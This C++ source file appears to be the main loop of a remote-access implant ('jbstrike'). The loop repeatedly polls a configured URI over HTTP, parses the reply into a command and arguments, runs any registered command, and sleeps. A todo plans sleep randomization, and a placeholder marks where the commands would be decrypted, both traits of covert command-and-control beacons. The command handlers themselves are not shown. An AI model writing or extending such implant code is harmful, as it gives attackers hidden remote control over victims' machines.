#include "Application.h"


jbstrike::Application::Application() {}


void jbstrike::Application::Run() {

	while(1) {
		std::string data = http.Get(cfg.UriString, "");
		jbstrike::ReceivedCmd ParsedCommand = ParseData(data);


		if (Commands.Has(ParsedCommand.Command)) {
			Commands.Run(ParsedCommand.Command, ParsedCommand.Args);
		}		

		Sleep(cfg.SleepTime);// @todo add randomization
	}

}


jbstrike::ReceivedCmd jbstrike::Application::ParseData(std::string data) {
	jbstrike::ReceivedCmd result;

	if (data == "") {
		result.Command = "undefined";

	}

	// Decryption here.

	result = jbstrike::split(data);

	return result;
}